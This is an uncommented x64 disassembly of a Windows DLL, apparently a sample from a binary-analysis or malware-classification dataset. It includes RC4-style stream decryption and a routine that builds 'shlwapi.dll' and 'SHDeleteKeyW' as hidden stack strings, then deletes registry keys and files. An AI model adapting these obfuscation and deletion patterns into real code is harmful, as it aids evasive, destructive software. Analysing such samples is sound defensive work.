je r-xdata
mov [ rsp + 0x68 ] rdi
call sub_18000aae0
movzx ecx [ r12 + 0x40 ]
add ecx r13d
mov rdi rax
call sub_18000a610
mov r8d r13d
mov rdx rbp
mov rcx rax
mov r14 rax
call sub_18001c4a0
movzx r8d [ r12 + 0x40 ]
lea rcx [ r13 + r14 ]
mov rdx rdi
call sub_18001c4a0
movzx r11d [ r12 + 0x40 ]
mov rcx rdi
add r13d r11d
call sub_18000a640
mov rdi [ rsp + 0x68 ]
mov r14 [ rsp + 0x70 ]
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r13
pop r12
pop rsi
pop rbp
retn
mov rcx r14
call sub_18000a640
sub_18000adc0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov edi edx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
mov rcx [ rcx + 0x30 ]
test rcx rcx
je r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
call sub_18000a640
nop
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call j_sub_18001c80c
sub_18000ae20
push rbx
sub rsp 0x140
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rdx rcx
lea rcx [ rsp + 0x40 ]
call sub_180006a70
nop
mov ecx 0x138
call sub_18001c84c
mov [ rsp + 0x158 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov eax ebx
mov rcx rax
call sub_1800186b0
xor ebx ebx
jmp r-xdata
mov rdx rbx
lea rcx [ rsp + 0x40 ]
call sub_180004000
nop
lea rcx [ rsp + 0x40 ]
call sub_180005040
nop
lea rcx [ rsp + 0x40 ]
call sub_180006df0
mov al 0x1
jmp r-xdata
mov rcx rax
call sub_18000f570
mov rbx rax
mov rdx rax
lea rcx [ rsp + 0x40 ]
call sub_180007070
mov ecx 0x1a0
call sub_18001c84c
mov [ rsp + 0x158 ] rax
test rax rax
je r-xdata
add rsp 0x140
pop rbx
retn
sub_18000af00
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x58 ] rsi
movzx ebx r9b
mov edi r8d
mov rsi rdx
mov rbp rcx
mov dl 0x4
call sub_18000aa50
nop
lea rax [ r--data ]
mov [ rbp ] rax
mov [ rbp + 0x48 ] bl
mov r8d edi
mov rdx rsi
mov rcx rbp
call sub_18000a160
movzx edx [ rsp + 0x60 ]
mov rcx rbp
call sub_18000adb0
nop
mov rax rbp
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000af80
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov ebx edx
mov rdi rcx
lea rax [ r--data ]
mov [ rcx ] rax
call sub_18000a200
nop
lea rax [ r--data ]
mov [ rdi ] rax
mov rcx rdi
call sub_18000a7c0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18000afe0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
movzx edx [ rcx + 0x48 ]
mov ecx 0x2
mov esi r9d
mov rbp r8
call sub_18000aee0
mov ecx eax
mov [ rbx ] ecx
shl rcx 0x2
call sub_18000a610
xor edi edi
mov ecx edi
mov r11 rax
cmp [ rbx ] ecx
jbe r-xdata
mov r10d edi
cmp [ rbx ] edi
jbe r-xdata
mov rdx rax
nop [ rax + rax ] ax
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov r9 rax
nop [ rax + rax ] ax
mov [ rdx ] ecx
inc ecx
add rdx 0x4
cmp ecx [ rbx ]
jb r-xdata
mov r8d [ r9 ]
xor edx edx
mov eax r10d
div esi
inc r10d
add r9 0x4
movsx eax [ rdx + rbp ]
xor edx edx
add eax r8d
add eax edi
div [ rbx ]
mov edi edx
mov eax [ r11 + rdx * 4 ]
mov [ r9 - 0x4 ] eax
mov [ r11 + rdx * 4 ] r8d
cmp r10d [ rbx ]
jb r-xdata
mov rax r11
sub_18000b0a0
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
mov rax r9
mov r9d [ rsp + 0x80 ]
mov rbp rdx
mov rdi r8
lea rdx [ rsp + 0x60 ]
mov r8 rax
mov rbx rcx
mov [ rsp + 0x60 ] 0x0
call sub_18000afe0
movzx ebx [ rbx + 0x48 ]
xor r9d r9d
mov rsi rax
shr bl 0x3
mov r10d r9d
mov r11d r9d
cmp [ rdi ] r9d
jbe r-xdata
mov rcx rsi
call sub_18000a640
mov rax rbp
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov [ rsp + 0x70 ] r12
mov r12d [ rsp + 0x60 ]
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x20 ] r15
movzx r15d bl
nop [ rax + rax ] eax
mov r10d [ rsp + 0x68 ]
add r11d r15d
cmp r11d [ rdi ]
jb r-xdata
nop [ rax + rax ] ax
xor edx edx
lea eax [ r9 + 0x1 ]
div r12d
mov r9d edx
mov ecx [ rsi + rdx * 4 ]
xor edx edx
mov [ rsp + 0x60 ] r9d
lea eax [ rcx + r10 ]
xor r10b r10b
div r12d
mov [ rsp + 0x68 ] edx
movsxd r14 edx
mov r13d [ rsi + rdx * 4 ]
mov [ rsi + rdx * 4 ] ecx
mov [ rsi + r9 * 4 ] r13d
test bl bl
je r-xdata
mov r15 [ rsp + 0x20 ]
mov r14 [ rsp + 0x28 ]
mov r13 [ rsp + 0x30 ]
mov r12 [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov eax [ rsi + r14 * 4 ]
xor edx edx
mov r9d ecx
add eax r13d
div r12d
movzx eax r10b
inc r10b
lea rcx [ rsi + rax ]
movzx eax [ rcx + rdx * 4 ]
xor [ r9 + rbp ] al
cmp r10b bl
jb r-xdata
movzx ecx r10b
add ecx r11d
cmp ecx [ rdi ]
jae r-xdata
sub_18000b220
cmp [ rcx + 0x18 ] 0x0
mov r9 rcx
je r-xdata
movzx eax [ rw-data ]
mov [ rcx + 0x18 ] rdx
mov [ rcx + 0x20 ] r8
movzx ecx [ rw-data ]
cmp r8 0x200000
cmova ecx eax
mov al 0x1
mov [ r9 + 0x11 ] cl
retn
xor al al
retn
sub_18000b260
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
test rcx rcx
je r-xdata
lea rcx [ rbx + 0x18 ]
add rsp 0x30
pop rbx
jmp sub_18001c294
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
nop
sub_18000b2b0
push rdi
sub rsp 0x20
mov rdi rdx
test rdx rdx
je r-xdata
xor eax eax
add rsp 0x20
pop rdi
retn
mov eax 0xffff
cmp [ rdx + 0x8 ] ax
je r-xdata
mov rcx [ rdx + 0x20 ]
mov rax [ rw-data ]
mov [ rsp + 0x38 ] rbp
lea rbp [ rcx + rax + 0x8 ]
mov edx 0x1
mov [ rsp + 0x40 ] rsi
mov rcx rbp
call sub_18001d210
mov rsi rax
test rax rax
jne r-xdata
mov ecx 0x10
mov [ rsp + 0x30 ] rbx
call sub_18001c84c
mov rbx rax
test rax rax
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
xor ebx ebx
mov [ rax ] 0x0
mov [ rax + 0x8 ] 0x0
jmp r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] rsi
mov [ rbx + 0x8 ] rbp
mov rax [ rdi ]
mov rdx [ rw-data ]
mov rcx [ rw-data ]
mov [ rsi ] rax
movzx eax [ rdi + 0x8 ]
add rcx rdx
mov [ rdx + rsi ] ax
movzx eax [ rdi + 0xa ]
mov [ rcx + rsi ] al
mov eax [ rdi + 0xc ]
mov rcx [ rw-data ]
add rcx rdx
mov [ rcx + rsi ] eax
mov rcx [ rw-data ]
movzx eax [ rdi + 0x10 ]
add rcx rdx
mov rdx rbp
mov [ rcx + rsi ] al
mov rcx [ rw-data ]
mov r9 [ rdi + 0x20 ]
mov r8 [ rdi + 0x18 ]
sub rdx rcx
lea rcx [ rcx + rsi + 0x8 ]
sub rdx 0x8
call sub_18001d25c
cmp [ rbx ] 0x0
jne r-xdata
sub_18000b3e0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x10 ]
call sub_18000a4c0
test al al
je r-xdata
xor al al
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0x10 ]
add rsp 0x20
pop rbx
jmp sub_18000a460
sub_18000b410
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x10 ]
call sub_18000a4c0
test al al
je r-xdata
xor al al
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0x10 ]
call sub_18000a580
mov rcx [ rbx + 0x10 ]
add rsp 0x20
pop rbx
jmp sub_18000a480
sub_18000b450
mov r8 [ rdx ]
xor eax eax
test r8 r8
je r-xdata
mov r9 rax
mov r9 [ rdx + 0x8 ]
sub r9 0x8
jmp r-xdata
mov rcx [ rcx + 0x10 ]
mov r8d r9d
mov rdx rax
jmp sub_18000a400
cmp [ rdx + 0x8 ] 0x8
jbe r-xdata
test r8 r8
je r-xdata
mov rax [ rw-data ]
add rax r8
sub_18000b490
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
xor ecx ecx
or edx 0xffffffff
mov rdi r8
call sub_18000a2a0
mov r8d edi
mov ebx eax
mov rdx rsi
shr ebx 0x10
xor bx ax
movzx ecx bx
call sub_18000a3b0
mov rsi [ rsp + 0x38 ]
movzx ecx bx
mov rbx [ rsp + 0x30 ]
movzx eax ax
shl eax 0x10
xor eax ecx
add rsp 0x20
pop rdi
retn
sub_18000b4e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
add rcx 0x18
mov rbx rdx
call sub_18001c2b4
mov rcx [ rdi + 0x10 ]
call sub_18000a4a0
mov r11 [ rdi ]
mov rdx rbx
mov rcx rdi
call [ r11 + 0x8 ]
mov rcx [ rdi + 0x10 ]
mov rbx rax
call sub_18000a480
test al al
jne r-xdata
lea rcx [ rdi + 0x18 ]
call sub_18001c2bc
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rdi + 0x10 ]
call sub_18000a460
sub_18000b560
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rsi r8
mov rbp rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
xor edi edi
mov [ rcx + 0x8 ] rdi
add rcx 0x18
call sub_18001c26c
nop
lea ecx [ rdi + 0x50 ]
call sub_18001c84c
mov [ rsp + 0x78 ] rax
test rax rax
je r-xdata
mov [ rbx + 0x10 ] rdi
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
mov [ rsp + 0x20 ] 0x4
mov r9b 0x8
mov r8d esi
mov rdx rbp
mov rcx rax
call sub_18000af00
mov rdi rax
sub_18000b5e0
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rbp r8
mov rsi rdx
test r8 r8
je r-xdata
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
xor eax eax
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
sub rax [ rw-data ]
cmp r9 rax
jb r-xdata
mov ecx 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] r12
call sub_18001c84c
movzx r8d [ rw-data ]
xor edx edx
mov rbx rax
test rax rax
je r-xdata
mov rbx rdx
mov [ rax ] rdx
mov eax 0xffff
mov [ rbx + 0xa ] 0xff
mov [ rbx + 0xc ] edx
mov [ rbx + 0x10 ] dl
mov [ rbx + 0x11 ] r8b
mov [ rbx + 0x8 ] ax
mov [ rbx + 0x18 ] rdx
mov [ rbx + 0x20 ] rdx
jmp r-xdata
cmp [ rbx + 0x18 ] 0x0
jne r-xdata
mov edx 0x1
mov rcx rdi
call sub_18001d210
mov rsi rax
test rax rax
jne r-xdata
mov rax [ rw-data ]
mov r12 [ rw-data ]
mov [ rbx ] rsi
sub rdi r12
movzx ecx [ rax + rbp ]
mov rax [ rw-data ]
mov [ rbx + 0x8 ] cx
movzx ecx [ rax + rbp ]
mov rax [ rw-data ]
mov [ rbx + 0xa ] cl
mov ecx [ rax + rbp ]
mov rax [ rw-data ]
mov [ rbx + 0xc ] ecx
movzx ecx [ rax + rbp ]
mov [ rbx + 0x10 ] cl
je r-xdata
mov rax rbx
jmp r-xdata
movzx eax [ rw-data ]
movzx ecx r8b
cmp rdi 0x200000
cmova ecx eax
mov [ rbx + 0x18 ] rdx
mov [ rbx + 0x20 ] rdi
mov [ rbx + 0x11 ] cl
lea r8 [ r12 + rbp ]
mov r9 rdi
mov rdx rdi
mov rcx rax
call sub_18001d25c
mov r8 rdi
mov rdx rsi
mov rcx rbx
call sub_18000b220
mov rax rbx
jmp r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov r12 [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_18001c80c
xor eax eax
call sub_18001c80c
sub_18000b760
push rbp
push r12
sub rsp 0x38
mov rbp rdx
mov r12 rcx
test rdx rdx
jne r-xdata
mov [ rsp + 0x50 ] rbx
call sub_18000b2b0
cmp [ rax ] 0x0
mov rbx rax
jne r-xdata
xor eax eax
add rsp 0x38
pop r12
pop rbp
retn
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x58 ] 0x0
mov rdi [ rax ]
mov [ rsp + 0x20 ] r13
test rdi rdi
je r-xdata
cmp [ rax + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov rax [ rax + 0x8 ]
sub rax 0x8
jmp r-xdata
xor eax eax
mov rbx [ rsp + 0x50 ]
add rsp 0x38
pop r12
pop rbp
retn
xor eax eax
jmp r-xdata
test rdi rdi
je r-xdata
lea r13 [ rax + 0xb ]
mov edx 0x1
mov rcx r13
call sub_18001d210
mov rsi rax
test rax rax
je r-xdata
mov rdi [ rsp + 0x28 ]
mov rsi [ rsp + 0x30 ]
mov r13 [ rsp + 0x20 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x38
pop r12
pop rbp
retn
xor r9d r9d
mov r9 [ rbx + 0x8 ]
sub r9 0x8
jmp r-xdata
xor r8d r8d
cmp [ rbx + 0x8 ] 0x8
jbe r-xdata
test rdi rdi
je r-xdata
xor edx edx
mov rdx [ rbx + 0x8 ]
sub rdx 0x8
jmp r-xdata
mov rax [ rw-data ]
lea r8 [ rdi + rax ]
jmp r-xdata
xor eax eax
mov rax [ rbx + 0x8 ]
sub rax 0x8
jmp r-xdata
mov rcx rsi
call sub_18001d25c
cmp [ rbx ] 0x0
je r-xdata
test rdi rdi
je r-xdata
mov rcx rbx
call j_sub_18001c80c
lea rcx [ r12 + 0x18 ]
call sub_18001c2b4
mov rcx [ r12 + 0x10 ]
lea r9 [ rsp + 0x58 ]
mov rax [ rcx ]
mov r8d r13d
mov rdx rsi
call [ rax + 0x8 ]
lea rcx [ r12 + 0x18 ]
mov rdi rax
call sub_18001c2bc
mov rcx rsi
call sub_18001c80c
test rdi rdi
jne r-xdata
call sub_18001c80c
mov r9d 0xb
lea rcx [ rax + rsi ]
lea r8 [ rw-data ]
mov edx r9d
call sub_18001d25c
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov r8d [ rsp + 0x58 ]
mov rdx rdi
mov rcx r12
call sub_18000b490
mov esi [ rsp + 0x58 ]
mov edx 0x1
add rsi 0xc
mov [ rsp + 0x60 ] eax
mov rcx rsi
call sub_18001d210
mov rcx [ rbp ]
mov r9d 0x4
mov [ rax ] rcx
lea r8 [ rsp + 0x60 ]
lea rcx [ rax + 0x8 ]
mov edx r9d
mov r12 rax
call sub_18001d25c
mov edx [ rsp + 0x58 ]
lea rcx [ r12 + 0xc ]
mov r9d edx
mov r8 rdi
call sub_18001d25c
mov ecx 0x10
call sub_18001c84c
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax ] r12
mov [ rax + 0x8 ] rsi
jmp r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
mov rax rbx
sub_18000b970
push r12
push r14
sub rsp 0x38
mov r14 rdx
mov r12 rcx
test rdx rdx
jne r-xdata
mov rax [ rcx ]
call [ rax ]
test al al
je r-xdata
xor eax eax
add rsp 0x38
pop r14
pop r12
retn
mov rcx [ r12 + 0x10 ]
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rbp
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x58 ] 0x0
mov [ rsp + 0x20 ] r13
xor edi edi
call sub_18000a460
lea r13 [ rw-data ]
test al al
je r-xdata
mov rcx [ r12 + 0x10 ]
call sub_18000a480
test al al
je r-xdata
mov rsi [ r12 + 0x10 ]
mov rcx r14
mov rbp [ rsi ]
call sub_18000b1e0
mov rbx [ rw-data ]
mov rdi rax
mov rcx r14
sub edi ebx
call sub_18000b200
lea r9 [ rsp + 0x58 ]
lea rdx [ rbx + rax ]
mov r8d edi
mov rcx rsi
call [ rbp + 0x10 ]
mov rdi rax
test rax rax
je r-xdata
mov rcx [ r12 + 0x10 ]
call sub_18000a4a0
test al al
je r-xdata
mov rsi [ r12 + 0x10 ]
mov rcx r14
mov rbp [ rsi ]
call sub_18000b1e0
mov rbx [ rw-data ]
mov rdi rax
mov rcx r14
sub edi ebx
call sub_18000b200
lea r9 [ rsp + 0x58 ]
lea rdx [ rbx + rax ]
mov r8d edi
mov rcx rsi
call [ rbp + 0x10 ]
mov rdi rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rsp + 0x58 ]
mov rdx [ rax + rdi - 0xb ]
lea rcx [ rax + rdi - 0xb ]
cmp rdx [ r13 ]
jne r-xdata
mov rcx [ r14 ]
test rcx rcx
je r-xdata
mov rcx [ r14 ]
test rcx rcx
je r-xdata
mov eax [ rsp + 0x58 ]
mov rdx [ rax + rdi - 0xb ]
lea rcx [ rax + rdi - 0xb ]
cmp rdx [ r13 ]
jne r-xdata
mov rdi [ rsp + 0x28 ]
mov rsi [ rsp + 0x30 ]
mov rbp [ rsp + 0x60 ]
mov rbx [ rsp + 0x50 ]
mov r13 [ rsp + 0x20 ]
add rsp 0x38
pop r14
pop r12
retn
sbb eax eax
sbb eax 0xffffffff
movzx edx [ rcx + 0x8 ]
cmp dx [ r13 + 0x8 ]
jne r-xdata
or rdx 0xffffffffffffffff
mov rax [ rw-data ]
mov rdx [ rcx + rax ]
jmp r-xdata
xor r8d r8d
mov r8 [ r14 + 0x8 ]
sub r8 0x8
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx edx [ rcx + 0x8 ]
cmp dx [ r13 + 0x8 ]
jne r-xdata
mov rcx [ r12 + 0x10 ]
call sub_18000a580
jmp r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
xor edi edi
movzx edx [ rcx + 0xa ]
cmp dl [ r13 + 0xa ]
jne r-xdata
mov r9d [ rsp + 0x58 ]
mov r8 rdi
mov rcx r12
sub r9 0xb
call sub_18000b5e0
mov rbx rax
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov rcx rax
mov edx 0x8
call [ HeapFree@IAT ]
mov rax rbx
xor edx edx
cmp [ r14 + 0x8 ] 0x8
jbe r-xdata
test rcx rcx
je r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
xor edi edi
movzx edx [ rcx + 0xa ]
cmp dl [ r13 + 0xa ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ rsp + 0x58 ]
lea rcx [ rax + rdi - 0xb ]
mov rax [ rax + rdi - 0xb ]
cmp rax [ r13 ]
jne r-xdata
mov rax [ rw-data ]
lea rdx [ rcx + rax ]
jmp r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx eax [ rcx + 0x8 ]
cmp ax [ r13 + 0x8 ]
jne r-xdata
mov rax [ rw-data ]
mov rcx [ r12 + 0x10 ]
lea r9 [ rsp + 0x58 ]
mov r10 [ rcx ]
sub r8d eax
add rdx rax
call [ r10 + 0x10 ]
mov rdi rax
test rax rax
jne r-xdata
test eax eax
je r-xdata
mov rcx [ r12 + 0x10 ]
call sub_18000a5a0
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
xor edi edi
jmp r-xdata
movzx eax [ rcx + 0xa ]
cmp al [ r13 + 0xa ]
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
sub_18000bca0
push rbx
sub rsp 0x20
mov rbx rcx
lea rdx [ rcx + 0x30 ]
mov rcx [ rcx + 0xd8 ]
call sub_18000eea0
test al al
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0xd8 ]
lea r8 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
mov [ rsp + 0x38 ] 0x0
mov [ rsp + 0x30 ] 0x0
call sub_18000eae0
test al al
je r-xdata
mov ecx 0x10
call sub_18001c84c
mov r11 rax
test rax rax
je r-xdata
xor r11d r11d
mov eax r11d
add rsp 0x20
pop rbx
retn
mov rax [ rsp + 0x38 ]
mov ecx [ rsp + 0x30 ]
mov [ r11 ] rax
mov rax r11
mov [ r11 + 0x8 ] rcx
add rsp 0x20
pop rbx
retn
sub_18000bd30
push rdi
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov rdi rcx
mov [ rsp + 0x28 ] 0x776c6873
mov [ rsp + 0x2c ] 0x2e697061
mov [ rsp + 0x30 ] 0x6c6c64
lea rcx [ rsp + 0x28 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov [ rsp + 0x38 ] 0x65444853
mov [ rsp + 0x3c ] 0x6574656c
mov [ rsp + 0x40 ] 0x5779654b
mov [ rsp + 0x44 ] 0x0
test rax rax
je r-xdata
lea rcx [ rsp + 0x28 ]
call [ LoadLibraryA@IAT ]
lea rbx [ rdi + 0x10 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea rdx [ rsp + 0x38 ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rdx [ rdi + 0xb0 ]
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
lea rbx [ rdi + 0x38 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov rcx 0xffffffff80000003
call rax
mov rdx [ rdx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
call [ DeleteFileW@IAT ]
mov rbx [ rbx ]
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov rcx rbx
call [ DeleteFileW@IAT ]
nop
mov rbx [ rbx ]
sub_18000be60
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x58 ] rsi
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x8 ] rax
xor ebp ebp
mov [ rcx + 0xc0 ] rbp
cmp [ rcx + 0xc8 ] 0x8
jb r-xdata
lea rax [ rcx + 0xb0 ]
mov rax [ rcx + 0xb0 ]
jmp r-xdata
mov rsi [ rbx + 0xd8 ]
test rsi rsi
je r-xdata
mov rcx rsi
call sub_18000eb40
mov rcx rsi
call j_sub_18001c80c
mov [ rax ] bp
mov rsi [ rcx + 0xe0 ]
test rsi rsi
je r-xdata
cmp [ rbx + 0xc8 ] 0x8
jb r-xdata
mov rcx rsi
call sub_18000eb40
mov rcx rsi
call j_sub_18001c80c
nop
mov [ rbx + 0xc8 ] 0x7
mov [ rbx + 0xc0 ] rbp
mov [ rbx + 0xb0 ] bp
cmp [ rbx + 0xa0 ] 0x8
jb r-xdata
mov rcx [ rbx + 0xb0 ]
call j_sub_18001c80c
mov [ rbx + 0xa0 ] 0x7
mov [ rbx + 0x98 ] rbp
mov [ rbx + 0x88 ] bp
cmp [ rbx + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x88 ]
call j_sub_18001c80c
mov [ rbx + 0x78 ] 0x7
mov [ rbx + 0x70 ] rbp
mov [ rbx + 0x60 ] bp
cmp [ rbx + 0x50 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x60 ]
call j_sub_18001c80c
mov [ rbx + 0x50 ] 0x7
mov [ rbx + 0x48 ] rbp
mov [ rbx + 0x38 ] bp
cmp [ rbx + 0x28 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x38 ]
call j_sub_18001c80c
mov [ rbx + 0x28 ] 0x7
mov [ rbx + 0x20 ] rbp
mov [ rbx + 0x10 ] bp
lea rax [ r--data ]
mov [ rbx ] rax
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rbx + 0x10 ]
call j_sub_18001c80c
sub_18000bfe0
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
lea r8 [ rcx + 0x80 ]
lea rdx [ rcx + 0x30 ]
mov rcx [ rcx + 0xd8 ]
call sub_18000ebb0
test al al
je r-xdata
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov rdx [ rbx ]
mov r8d [ rdx + 0x8 ]
mov rdx [ rdx ]
mov rcx [ rdi + 0xd8 ]
call sub_18000e930
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_18000c070
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
lea r8 [ rcx + 0x58 ]
lea rdx [ rcx + 0x8 ]
mov rcx [ rcx + 0xd0 ]
call sub_18000ebb0
test al al
je r-xdata
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov rdx [ rbx ]
mov r8d [ rdx + 0x8 ]
mov rdx [ rdx ]
mov rcx [ rdi + 0xd0 ]
call sub_18000e930
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_18000c0f0
mov [ rsp + 0x18 ] rbx
push rbp
push r12
push r13
sub rsp 0x20
mov r12 r8
mov r8 [ rcx + 0x10 ]
mov rbp r9
mov r13 rdx
mov rbx rcx
cmp r8 rdx
jb r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
mov rax [ r12 + 0x10 ]
cmp rax r9
jb r-xdata
sub rax r9
mov [ rsp + 0x40 ] rsi
mov rsi [ rsp + 0x60 ]
cmp rax rsi
cmovb rsi rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rsi
ja r-xdata
mov [ rsp + 0x48 ] rdi
test rsi rsi
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
